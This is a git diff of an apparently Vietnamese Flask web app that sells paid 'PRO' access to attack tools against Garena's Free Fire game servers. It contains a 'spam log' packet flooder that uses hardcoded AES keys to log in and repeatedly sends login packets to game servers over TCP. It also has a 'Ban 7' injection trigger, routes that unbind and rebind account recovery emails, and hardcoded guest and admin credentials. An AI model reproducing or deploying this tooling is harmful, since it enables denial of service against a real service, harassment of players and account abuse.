@@ -45,7 +45,6 @@ FIREBASE_SECRET = ""
 
 # Firebase helper functions
 def firebase_get(path):
-    """Get data from Firebase"""
     try:
         url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
         response = requests.get(url)
@@ -56,7 +55,6 @@ def firebase_get(path):
         return None
 
 def firebase_set(path, data):
-    """Set data in Firebase"""
     try:
         url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
         response = requests.put(url, json=data)
@@ -65,7 +63,6 @@ def firebase_set(path, data):
         return False
 
 def firebase_update(path, data):
-    """Update data in Firebase"""
     try:
         url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
         response = requests.patch(url, json=data)
@@ -74,7 +71,6 @@ def firebase_update(path, data):
         return False
 
 def firebase_check_exists(path):
-    """Check if data exists in Firebase"""
     try:
         url = f"{FIREBASE_URL}{path}.json?auth={FIREBASE_SECRET}"
         response = requests.get(url)
@@ -85,7 +81,7 @@ def firebase_check_exists(path):
 # Spam Log global state
 spam_log_threads = {}
 spam_log_stop_events = {}
-active_spams = {}  # key: username, value: {at, thread, stop_event, status, ...}
+active_spams = {}
 SPAM_CACHE_FILE = 'active_spams_cache.json'
 
 BAN7_BODY_BASE64 = (
@@ -124,7 +120,6 @@ def save_spam_cache(data):
     except:
         pass
 
-# SimpleProtobuf class for SpamLog
 class SimpleProtobuf:
     @staticmethod
     def encode_varint(value):
@@ -157,7 +152,6 @@ class SimpleProtobuf:
         return bytes(payload)
 
 def get_available_room_spam(hex_data):
-    """Parse GetLoginData response to get server IP and port"""
     try:
         data = bytes.fromhex(hex_data)
         result = {}
@@ -201,7 +195,6 @@ def get_available_room_spam(hex_data):
         return {}
 
 def spam_loop(username, ip, port, packet, iv_ms, end_time, stop_event=None):
-    """Spam loop function from WebCu - uses TCP socket directly"""
     while time.time() < end_time:
         if username not in active_spams or (stop_event and stop_event.is_set()):
             break
@@ -218,16 +211,13 @@ def spam_loop(username, ip, port, packet, iv_ms, end_time, stop_event=None):
         save_spam_cache(active_spams)
 
 def send_packet_tcp(ip, port, packet, timeout=5):
-    """Send packet via TCP socket"""
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         s.connect((ip, port))
         s.sendall(packet)
 
 def process_spam_log(username, access_token, duration_seconds, stop_event):
-    """Process spam log in background thread - WebCu style"""
     try:
-
         headers = {
             "Host": "loginbp.ggpolarbear.com",
             "Content-Type": "application/x-www-form-urlencoded",
@@ -237,7 +227,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             "Connection": "keep-alive"
         }
 
-        # Token inspection
         r_inspect = requests.get(
             f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
             timeout=10
@@ -248,12 +237,10 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
         open_id = r_inspect.get('open_id')
         platform = str(r_inspect.get('platform'))
 
-        # Build payload
         key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
         pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
         enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
 
-        # MajorLogin
         r1 = requests.post(
             "https://loginbp.ggpolarbear.com/MajorLogin",
             headers=headers,
@@ -269,7 +256,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             time.sleep(5)
             return
 
-        # Parse MajorLogin response
         resp_pb = MajorLogin_res_pb2.MajorLoginRes()
         try:
             dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
@@ -277,7 +263,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
         except:
             resp_pb.ParseFromString(r1.content)
 
-        # GetLoginData
         headers["Host"] = "clientbp.ggpolarbear.com"
         headers["Authorization"] = f"Bearer {resp_pb.account_jwt}"
         r2 = requests.post(
@@ -288,7 +273,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             verify=False
         )
 
-        # Parse server address
         room_info = get_available_room_spam(r2.content.hex())
         addr = room_info.get('14', {}).get('data')
         if not addr:
@@ -297,7 +281,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
         online_ip = addr[:-6]
         online_port = int(addr[-5:])
 
-        # Build final packet
         jwt_parts = resp_pb.account_jwt.split('.')
         jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
         acc_id = int(jwt_payload.get("account_id", 0))
@@ -311,7 +294,6 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             len(enc_jwt).to_bytes(4, "big").hex()
         ) + enc_jwt
 
-        # Store in active_spams
         end_time = time.time() + duration_seconds
         active_spams[username] = {
             'at': access_token,
@@ -324,13 +306,10 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             'port': online_port,
             'end_time': end_time,
             'packet': final_packet,
-            'interval': 500  # Default 500ms
+            'interval': 500
         }
 
-        # Save to cache
         save_spam_cache(active_spams)
-
-        # Start spam loop
         spam_loop(username, online_ip, online_port, final_packet, 500, end_time, stop_event)
 
     except Exception as e:
@@ -339,33 +318,27 @@ def process_spam_log(username, access_token, duration_seconds, stop_event):
             save_spam_cache(active_spams)
 
 def firebase_get(path):
-    """Get data from Firebase"""
     url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
     response = requests.get(url)
     return response.json() if response.status_code == 200 else None
 
 def firebase_set(path, data):
-    """Set data in Firebase"""
     url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
     response = requests.put(url, json=data)
     return response.status_code == 200
 
 def firebase_update(path, data):
-    """Update data in Firebase"""
     url = f"{FIREBASE_URL}/{path}.json?auth={FIREBASE_SECRET}"
     response = requests.patch(url, json=data)
     return response.status_code == 200
 
 def track_visit():
-    """Track website visit"""
     try:
         visits = firebase_get('visits')
         if not visits:
             visits = {}
-        
         today = datetime.now().strftime('%Y-%m-%d')
         visits[today] = visits.get(today, 0) + 1
-        
         firebase_set('visits', visits)
     except Exception as e:
         print(f"Error tracking visit: {e}")
@@ -395,7 +368,6 @@ def get_user_usage(username):
     users = load_users()
     user_data = users.get(username, {})
     user_usage = usage.get(username, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
-    # Get is_pro from users collection
     user_usage['is_pro'] = user_data.get('is_pro', False) or user_usage.get('is_pro', False)
     return user_usage
 
@@ -560,7 +532,6 @@ def build_login_packet_from_jwt(jwt_token: str, key, iv) -> bytes:
     return bytes.fromhex(header_hex) + enc_token
 
 def parse_duration(duration_str: str) -> int:
-    """Parse duration string like '1d:2h:30m:10s' to seconds"""
     total = 0
     parts = duration_str.split(':')
     for part in parts:
@@ -589,7 +560,6 @@ def _str_field(f, v):
     if isinstance(v, str): v = v.encode()
     return _varint((f << 3) | 2) + _varint(len(v)) + v
 
-# ---------------- SimpleProtobuf Class for Ban 7 ---------------- #
 class SimpleProtobuf:
     @staticmethod
     def encode_varint(value):
@@ -839,7 +809,6 @@ def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=3.0):
 
 def process_login(access_token):
     try:
-        # Step 1: Inspect token
         inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
         inspect_headers = {
             "Accept-Encoding": "gzip, deflate, br",
@@ -860,7 +829,6 @@ def process_login(access_token):
         NEW_OPEN_ID = data.get('open_id')
         platform_ = data.get('platform')
 
-        # Step 2: MajorLogin
         key = b'Yg&tc%DEuh6%Zc^8'
         iv = b'6oyZDr22E3ychjM%'
         MajorLogin_url = "https://loginbp.ggpolarbear.com/MajorLogin"
@@ -883,17 +851,11 @@ def process_login(access_token):
 
         try:
             response = requests.post(MajorLogin_url, headers=MajorLogin_headers, data=enc_data, timeout=15)
-            # Show Debug
-#            print(f"[D6] status: {response.status_code}")
-#            print(f"[D7] response headers: {dict(response.headers)}")
-#            print(f"[D8] response body hex: {response.content.hex()}")
-#            print(f"[D9] response body text: {response.text}")
             if not response.ok:
                 return {"success": False, "message": f"MajorLogin error: {response.status_code}"}
         except Exception as e:
             return {"success": False, "message": f"MajorLogin failed: {str(e)}"}
 
-        # Step 3: Parse MajorLogin response
         resp_enc = response.content
         cipher_resp = AES.new(key, AES.MODE_CBC, iv)
         resp_msg = MajorLogin_res_pb2.MajorLoginRes()
@@ -907,7 +869,6 @@ def process_login(access_token):
             resp_msg.ParseFromString(resp_enc)
             parsed_data = SimpleProtobuf.parse_protobuf(resp_enc)
 
-        # Get timestamp
         field_21_value = parsed_data.get(21, None)
         if field_21_value:
             ts = Timestamp()
@@ -920,7 +881,6 @@ def process_login(access_token):
             ts.FromNanoseconds(exp * 1_000_000_000)
             timetamp = ts.seconds * 1_000_000_000 + ts.nanos
 
-        # Step 4: GetLoginData
         GetLoginData_resURL = "https://clientbp.ggpolarbear.com/GetLoginData"
         GetLoginData_res_headers = {
             'Expect': '100-continue',
@@ -942,7 +902,6 @@ def process_login(access_token):
         except Exception as e:
             return {"success": False, "message": f"GetLoginData failed: {str(e)}"}
 
-        # Step 5: Parse server address
         online_ip = None
         online_port = None
 
@@ -964,7 +923,6 @@ def process_login(access_token):
         except Exception as e:
             return {"success": False, "message": f"Error processing response: {str(e)}"}
 
-        # Step 6: Build and send packet
         payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
         if payload_jwt is None:
             return {"success": False, "message": "Failed to decode JWT"}
@@ -993,18 +951,14 @@ def process_login(access_token):
     except Exception as e:
         return {"success": False, "message": f"Unexpected error: {str(e)}"}
 
-#Admin Dashboard Password (hashed)
-ADMIN_USERNAME = "ngvanducthinh"  # Thêm username admin cố định
+ADMIN_USERNAME = "ngvanducthinh"
 ADMIN_PASSWORD_HASH = hashlib.sha256("21062013???".encode()).hexdigest()
 
 def check_tool_pro(username, tool_name):
-    """Check if user has Pro access to a specific tool"""
-    # 1. Check if user is overall Pro
     usage = firebase_get(f'/usage/{username}')
     if usage and usage.get('is_pro'):
         return True
 
-    # 2. Check if user has an active key for this tool
     user_pro_tools = firebase_get(f'/user_pro_tools/{username}')
     if user_pro_tools and tool_name in user_pro_tools:
         tool_data = user_pro_tools[tool_name]
@@ -1017,7 +971,6 @@ def check_tool_pro(username, tool_name):
     return False
 
 def require_pro(tool_name='all'):
-    """Trả về response lỗi nếu user chưa đăng nhập hoặc chưa có PRO, ngược lại trả về None"""
     if 'authenticated' not in session or not session['authenticated']:
         return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})
 
@@ -1027,6 +980,101 @@ def require_pro(tool_name='all'):
 
     return None
 
+# ============ ADMIN BAN / UNBAN / TOGGLE PRO API ============
+@app.route('/api/admin/ban_user', methods=['POST'])
+def admin_ban_user():
+    """Ban tài khoản người dùng với lý do"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
+    reason = data.get('reason', 'Vi phạm điều khoản sử dụng')
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    if user_data.get('is_admin', False):
+        return jsonify({'success': False, 'error': 'Không thể ban tài khoản Admin'})
+    
+    ban_data = {
+        'is_banned': True,
+        'ban_reason': reason,
+        'banned_at': datetime.now().isoformat(),
+        'banned_by': session.get('admin_username', 'Admin')
+    }
+    firebase_update(f'/users/{username}', ban_data)
+    firebase_update(f'/users/{username}', {'remember_token': None})
+    
+    return jsonify({
+        'success': True,
+        'message': f'Đã ban tài khoản {username}',
+        'reason': reason
+    })
+
+@app.route('/api/admin/unban_user', methods=['POST'])
+def admin_unban_user():
+    """Mở khóa tài khoản người dùng"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    firebase_update(f'/users/{username}', {
+        'is_banned': False,
+        'ban_reason': None,
+        'banned_at': None,
+        'banned_by': None
+    })
+    
+    return jsonify({
+        'success': True,
+        'message': f'Đã mở khóa tài khoản {username}'
+    })
+
+@app.route('/api/admin/toggle_pro', methods=['POST'])
+def admin_toggle_pro():
+    """Bật/tắt quyền PRO của người dùng"""
+    if not session.get('admin_authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'})
+    
+    data = request.json
+    username = data.get('username')
+    is_pro = data.get('is_pro', False)
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    firebase_update(f'/users/{username}', {'is_pro': is_pro})
+    firebase_update(f'/usage/{username}', {'is_pro': is_pro})
+    
+    if not is_pro:
+        firebase_set(f'/user_pro_tools/{username}', None)
+    
+    status = "PRO" if is_pro else "FREE"
+    return jsonify({
+        'success': True, 
+        'message': f'Đã chuyển {username} sang gói {status}',
+        'is_pro': is_pro
+    })
+
+# ============ CÁC ROUTE CŨ ============
 @app.route('/api/activate_key', methods=['POST'])
 def activate_key():
     try:
@@ -1051,7 +1099,6 @@ def activate_key():
         if not target_tool:
             return jsonify({'success': False, 'error': 'Key không hợp lệ (thiếu thông tin tính năng)'})
 
-        # Activate for user
         activation_data = {
             'is_lifetime': key_data.get('is_lifetime'),
             'expiry': key_data.get('expiry'),
@@ -1059,12 +1106,10 @@ def activate_key():
         }
 
         if target_tool == 'all':
-            # Global Pro
             firebase_update(f'/usage/{username}', {'is_pro': True})
             firebase_update(f'/users/{username}', {'is_pro': True})
             msg = "Kích hoạt gói PRO toàn diện thành công!"
         else:
-            # Specific tool Pro
             firebase_update(f'/user_pro_tools/{username}', {target_tool: activation_data})
             tool_display_name = "Ban 7 Ngày" if target_tool == 'ban7' else "Spam Log" if target_tool == 'spam_log' else target_tool
             msg = f"Kích hoạt Pro cho tính năng {tool_display_name} thành công!"
@@ -1075,33 +1120,27 @@ def activate_key():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Admin APIs
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login2():
     if request.method == 'POST':
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '')
         
-        # Kiểm tra cả username và password
         if username == ADMIN_USERNAME and hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH:
             session['admin_authenticated'] = True
             session['admin_username'] = username
             return redirect('/dashboard')
         
-        # Nếu sai, trả về lỗi
         return render_template('admin_login.html', error="Tên đăng nhập hoặc mật khẩu không đúng")
     
     return render_template('admin_login.html')
 
 @app.route('/dashboard')
 def dashboard():
-    # Kiểm tra cả 2 session để đảm bảo không bị lỗi văng ra ngoài
     if not session.get('admin_authenticated') and not session.get('admin_logged_in'):
         return redirect('/admin/login')
     
-    # Lấy thông tin admin từ session
     admin_username = session.get('admin_username', 'Admin')
-    
     return render_template('dashboard.html', admin_username=admin_username)
 
 @app.route('/api/admin/get_users', methods=['GET'])
@@ -1119,7 +1158,7 @@ def admin_update_user():
         return jsonify({'success': False, 'error': 'Unauthorized'})
     data = request.json
     username = data.get('username')
-    new_data = data.get('new_data') # email, is_pro, etc.
+    new_data = data.get('new_data')
     new_password = data.get('new_password')
 
     if new_password:
@@ -1148,7 +1187,7 @@ def admin_create_key():
     data = request.json
     tool_name = data.get('tool_name')
     is_lifetime = data.get('is_lifetime', False)
-    expiry = data.get('expiry') # YYYY-MM-DD HH:MM:SS
+    expiry = data.get('expiry')
 
     key_code = "KEY-" + str(uuid.uuid4())[:8].upper() + "-" + str(random.randint(1000, 9999))
     key_data = {
@@ -1205,16 +1244,12 @@ def trigger_ban7_injection(jwt_token, version):
 @app.route('/api/ban7', methods=['POST'])
 def ban7():
     try:
-        # Check if user is logged in
         if 'authenticated' not in session or not session['authenticated']:
             return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})
 
         username = session.get('username')
-
-        # Check Pro access
         is_pro = check_tool_pro(username, 'ban7')
 
-        # PRO only - không có lượt dùng thử
         if not is_pro:
             return jsonify({
                 'success': False,
@@ -1227,7 +1262,6 @@ def ban7():
         if not access_token:
             return jsonify({'success': False, 'error': 'Access token là bắt buộc'})
 
-        # Step 1: Get JWT
         try:
             open_id, platform = inspect_token(access_token)
             jwt_token, _, _ = do_major_login(open_id, access_token, platform)
@@ -1241,7 +1275,6 @@ def ban7():
         nickname = user_data.get('nickname', 'Unknown')
         version = user_data.get('release_version', 'OB53')
         
-        # Trigger injection once
         resp = trigger_ban7_injection(jwt_token, version)
         
         if resp and resp.status_code == 200:
@@ -1261,7 +1294,6 @@ def ban7():
         return jsonify({'success': False, 'error': str(e)})
 
 def save_task(task_id, task_data):
-    """Save task to tasks.json"""
     try:
         if os.path.exists('tasks.json'):
             with open('tasks.json', 'r') as f:
@@ -1279,7 +1311,6 @@ def save_task(task_id, task_data):
     return task_id
 
 def get_task_status(task_id):
-    """Get task status from tasks.json"""
     try:
         with open('tasks.json', 'r') as f:
             tasks = json.load(f)
@@ -1292,7 +1323,6 @@ def get_task_status(task_id):
         return None
 
 def update_task_status(task_id, status, result=None):
-    """Update task status in tasks.json"""
     try:
         with open('tasks.json', 'r') as f:
             tasks = json.load(f)
@@ -1374,15 +1404,12 @@ def guest_get_access(uid, password):
 
 @app.route('/')
 def index():
-    # Track visit
     track_visit()
     return render_template('index.html')
 
 @app.route('/tools')
 def tools():
-    # Check if user is logged in
     if 'authenticated' not in session or not session['authenticated']:
-        # Check remember me cookie
         remember_token = request.cookies.get('remember_token')
         if remember_token:
             users = firebase_get('/users')
@@ -1400,7 +1427,6 @@ def tools():
 @app.route('/api/upgrade_pro', methods=['POST'])
 def upgrade_pro():
     try:
-        # Check if user is logged in
         if 'authenticated' not in session or not session['authenticated']:
             return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để nâng cấp'})
         
@@ -1410,12 +1436,9 @@ def upgrade_pro():
         if username not in usage:
             usage[username] = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
         
-        # For demo purposes, auto-upgrade to pro
-        # In production, this would verify payment from telegram
         usage[username]['is_pro'] = True
         save_usage(usage)
         
-        # Also update users collection
         users = load_users()
         if username in users:
             users[username]['is_pro'] = True
@@ -1425,24 +1448,20 @@ def upgrade_pro():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Dashboard API endpoints
 @app.route('/api/admin/stats', methods=['GET'])
 def admin_stats():
     try:
         if 'admin_logged_in' not in session or not session['admin_logged_in']:
             return jsonify({'success': False, 'error': 'Unauthorized'})
         
-        # Get statistics
         users = load_users()
         total_users = len(users)
         pro_users = sum(1 for u in users.values() if u.get('is_pro', False))
         usage = load_usage()
         
-        # Calculate total usage
         total_ban7 = sum(u.get('ban7', 0) for u in usage.values())
         total_spam_log = sum(u.get('spam_log', 0) for u in usage.values())
         
-        # Get visits today
         visits = firebase_get('visits')
         today = datetime.now().strftime('%Y-%m-%d')
         visits_today = visits.get(today, 0) if visits else 0
@@ -1470,7 +1489,6 @@ def admin_users():
         usage = load_usage()
         users = load_users()
         
-        # Combine user data with usage
         users_list = []
         for uname, udata in users.items():
             uusage = usage.get(uname, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
@@ -1521,14 +1539,12 @@ def admin_user(username):
             if username not in users:
                 return jsonify({'success': False, 'error': 'User not found'})
             
-            # Update user data
             if 'email' in data:
                 users[username]['email'] = data['email']
             if 'password' in data:
                 users[username]['password'] = hashlib.sha256(data['password'].encode()).hexdigest()
             if 'is_pro' in data:
                 users[username]['is_pro'] = data['is_pro']
-                # Also update usage
                 usage = load_usage()
                 if username not in usage:
                     usage[username] = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
@@ -1544,11 +1560,9 @@ def admin_user(username):
             if username not in users:
                 return jsonify({'success': False, 'error': 'User not found'})
             
-            # Delete user
             del users[username]
             save_users(users)
             
-            # Delete usage
             usage = load_usage()
             if username in usage:
                 del usage[username]
@@ -1566,10 +1580,9 @@ def admin_feature_toggle():
             return jsonify({'success': False, 'error': 'Unauthorized'})
         
         data = request.json
-        feature = data.get('feature')  # 'ban7' or 'spam_log'
+        feature = data.get('feature')
         enabled = data.get('enabled', True)
         
-        # Store feature toggle in Firebase
         features = firebase_get('features') or {}
         features[feature] = enabled
         firebase_set('features', features)
@@ -1588,7 +1601,6 @@ def admin_login_api():
         if not username or not password:
             return jsonify({'success': False, 'error': 'Username và password là bắt buộc'})
         
-        # Hardcoded admin credentials (you can change this)
         ADMIN_USERNAME = "admin"
         ADMIN_PASSWORD = "admin123"
         
@@ -1630,14 +1642,11 @@ def get_lookup_token_info(region: str):
     if info and time.time() < info['expires_at']:
         return info['token'], info['server_url']
     
-    # Use guest account
     account = "uid=5206080075&password=EBBDA2E490024A422713FE41114EA0FE4DB3C2EB5AF95B474B34BD7AC787CB27"
     access_token, _ = get_lookup_access_token(account)
     
-    # Get open_id and platform
     open_id, platform = inspect_token(access_token)
     
-    # Use existing MajorLogin logic but parse for server_url
     url = "https://loginbp.ggpolarbear.com/MajorLogin"
     headers = {
         'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': "OB53",
@@ -1694,7 +1703,6 @@ def lookup_account():
         if not uid_str:
             return jsonify({'success': False, 'error': 'UID là bắt buộc'})
 
-        # Build request using ParseDict for safety
         req = main_pb2.GetPlayerPersonalShow()
         json_format.ParseDict({'a': int(uid_str), 'b': 7}, req)
         
@@ -1954,7 +1962,6 @@ def add_recovery_email():
             return jsonify({'success': False, 'error': 'Security code must be 6 digits'})
         
         if not verifier_token:
-            # Verify OTP if verifier_token not provided
             vr = verify_otp(otp, email, access_token)
             if vr.status_code != 200:
                 return jsonify({'success': False, 'error': 'OTP verification failed'})
@@ -1963,10 +1970,8 @@ def add_recovery_email():
             if not verifier_token:
                 return jsonify({'success': False, 'error': 'No verifier token'})
         
-        # Cancel any existing request
         cancel_request(access_token)
         
-        # Create bind request with security code
         hashed_password = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
         url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
         data = {
@@ -1987,9 +1992,7 @@ def add_recovery_email():
 
 @app.route('/api/spam_log', methods=['POST'])
 def spam_log():
-    """WebCu style spam log endpoint with init/stop actions"""
     try:
-        # Check if user is logged in
         if 'authenticated' not in session or not session['authenticated']:
             return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})
 
@@ -1997,17 +2000,14 @@ def spam_log():
         data = request.json
         action = data.get('action', 'start')
 
-        # Tính năng đang bảo trì - không ai sử dụng được (PRO hay FREE)
         return jsonify({
             'success': False,
             'error': 'Tính năng này đang bảo trì, vui lòng quay lại sau!'
         })
 
         if action == 'start':
-            # Check Pro access
             is_pro = check_tool_pro(username, 'spam_log')
 
-            # PRO only - không có lượt dùng thử
             if not is_pro:
                 return jsonify({
                     'success': False,
@@ -2021,7 +2021,6 @@ def spam_log():
             if not access_token:
                 return jsonify({'success': False, 'error': 'Vui lòng cung cấp Access Token'})
 
-            # Check if already running
             if username in active_spams and active_spams[username]['status'] == 'running':
                 s = active_spams[username]
                 return jsonify({
@@ -2036,17 +2035,13 @@ def spam_log():
                 })
 
             try:
-                # Use helper function for token inspection
                 open_id, platform = inspect_token(access_token)
                 
-                # Try multiple platforms for MajorLogin to avoid failure
                 jwt = None
                 m_key, m_iv = None, None
-                # Use pt in [platform, 2, 3, 4, 6, 8] but prioritize original platform
                 platforms_to_try = [platform] + [p for p in [2, 3, 4, 6, 8] if p != platform]
                 for pt in platforms_to_try:
                     try:
-                        # Build payload
                         key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
                         
                         pl = bytearray()
@@ -2096,8 +2091,6 @@ def spam_log():
                 if not jwt:
                     return jsonify({'success': False, 'error': 'Đăng nhập MajorLogin thất bại sau nhiều lần thử'})
 
-                # GetLoginData
-                # Headers for GetLoginData
                 gld_headers = {
                     "Host": "clientbp.ggpolarbear.com",
                     "Authorization": f"Bearer {jwt}",
@@ -2116,7 +2109,6 @@ def spam_log():
                     verify=False
                 )
 
-                # Parse server address
                 room_info = get_available_room_spam(r2.content.hex())
                 addr = room_info.get('14', {}).get('data')
                 if not addr:
@@ -2125,7 +2117,6 @@ def spam_log():
                 online_ip = addr[:-6]
                 online_port = int(addr[-5:])
 
-                # Build final packet
                 jwt_parts = jwt.split('.')
                 jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
                 acc_id = int(jwt_payload.get("account_id", 0))
@@ -2139,7 +2130,6 @@ def spam_log():
                     len(enc_jwt).to_bytes(4, "big").hex()
                 ) + enc_jwt
 
-                # Initialize active_spams
                 end_time = time.time() + (duration_ms / 1000.0)
                 stop_event = threading.Event()
 
@@ -2158,7 +2148,6 @@ def spam_log():
                     'total_ms': duration_ms
                 }
 
-                # Start thread
                 thread = threading.Thread(
                     target=spam_loop,
                     args=(username, online_ip, online_port, final_packet, interval, end_time, stop_event)
@@ -2166,10 +2155,7 @@ def spam_log():
                 thread.daemon = True
                 thread.start()
 
-                # Save to cache
                 save_spam_cache(active_spams)
-
-                # Update usage
                 update_user_usage(username, 'spam_log')
 
                 return jsonify({
@@ -2184,8 +2170,6 @@ def spam_log():
                 return jsonify({'success': False, 'error': str(e)})
 
         elif action == 'stop':
-            # Stop action is allowed even if usage limit is reached
-            # Delete from cache
             cache = load_spam_cache()
             if str(username) in cache:
                 del cache[str(username)]
@@ -2195,12 +2179,9 @@ def spam_log():
                 except:
                     pass
 
-            # Delete from RAM
             if username in active_spams:
                 active_spams[username]['stop_event'].set()
                 active_spams[username]['status'] = 'stopped'
-                # Optional: keep it in active_spams for a bit to show 'Stopped' UI, 
-                # but user wants it to return to initial state.
                 del active_spams[username]
                 return jsonify({'success': True, 'message': 'Đã dừng và xóa tiến trình thành công'})
 
@@ -2214,15 +2195,12 @@ def spam_log():
 
 @app.route('/api/spam_status', methods=['GET'])
 def spam_status():
-    """Get spam log status - WebCu style for polling"""
     try:
-        # Check if user is logged in
         if 'authenticated' not in session or not session['authenticated']:
             return jsonify({'success': False, 'error': 'Chưa xác thực'})
 
         username = session.get('username')
 
-        # Check cache for resurrection if server crashed
         if username not in active_spams:
             cache = load_spam_cache()
             c_item = cache.get(str(username))
@@ -2250,7 +2228,6 @@ def spam_status():
                     'total_ms': c_item.get('total_ms', 10000)
                 }
 
-                # Resurrect thread
                 thread = threading.Thread(
                     target=spam_loop,
                     args=(username, c_item.get('ip'), c_item.get('port'), pkt_data, c_item.get('interval'), c_item.get('end_time'), stop_event)
@@ -2262,7 +2239,7 @@ def spam_status():
             return jsonify({'success': True, 'status': 'idle'})
 
         s = active_spams[username]
-        save_spam_cache(active_spams)  # Update cache continuously
+        save_spam_cache(active_spams)
 
         return jsonify({
             'success': True,
@@ -2302,7 +2279,7 @@ def long_bio():
         data = request.json
         jwt_token = data.get('jwt_token')
         bio_text = data.get('bio_text')
-        method = data.get('method', 'jwt')  # jwt, access, guest
+        method = data.get('method', 'jwt')
         access_token = data.get('access_token')
         uid = data.get('uid')
         password = data.get('password')
@@ -2310,7 +2287,6 @@ def long_bio():
         if not bio_text:
             return jsonify({'success': False, 'error': 'Nội dung tiểu sử là bắt buộc'})
         
-        # Get JWT based on method
         if method == 'access':
             if not access_token:
                 return jsonify({'success': False, 'error': 'Vui lòng cung cấp Access Token'})
@@ -2329,7 +2305,6 @@ def long_bio():
         else:
             return jsonify({'success': False, 'error': 'Phương thức không hợp lệ'})
         
-        # Build Protobuf Payload
         pl = bytearray()
         pl += _int_field(2, 17)
         pl += _str_field(5, b'')
@@ -2444,7 +2419,6 @@ def send_otp_unbind():
         if '"result":0' in res_text:
             return jsonify({'success': True, 'message': 'Mã OTP đã gửi đến email của bạn'})
         else:
-            # Try to parse error message if available
             try:
                 err_data = resp.json()
                 error_msg = err_data.get('error', resp.text)
@@ -2517,7 +2491,7 @@ def unbind_email():
         data = request.json
         email = data.get('email', '').strip()
         access_token = data.get('access_token', '').strip()
-        method = data.get('method', 'otp')  # otp or password
+        method = data.get('method', 'otp')
         otp = data.get('otp', '').strip()
         security_code = data.get('security_code', '').strip()
         
@@ -2529,7 +2503,6 @@ def unbind_email():
         if method == 'otp':
             if not otp:
                 return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP'})
-            # Verify OTP
             r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                              headers=GARENA_HEADERS,
                              data={"email": email, "otp": otp, "app_id": "100067", 
@@ -2548,7 +2521,6 @@ def unbind_email():
         if not identity_token:
             return jsonify({'success': False, 'error': f'Không lấy được mã xác thực danh tính: {r.text}'})
         
-        # Create unbind request
         resp = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                            headers=GARENA_HEADERS,
                            data={"app_id": "100067", "access_token": access_token, 
@@ -2571,7 +2543,7 @@ def change_bind_email():
         access_token = data.get('access_token', '').strip()
         old_email = data.get('old_email', '').strip()
         new_email = data.get('new_email', '').strip()
-        method = data.get('method', 'otp')  # otp or password
+        method = data.get('method', 'otp')
         otp_old = data.get('otp_old', '').strip()
         security_code = data.get('security_code', '').strip()
         otp_new = data.get('otp_new', '').strip()
@@ -2584,7 +2556,6 @@ def change_bind_email():
         if method == 'otp':
             if not otp_old:
                 return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP cho email cũ'})
-            # Verify old OTP / Verify Identity
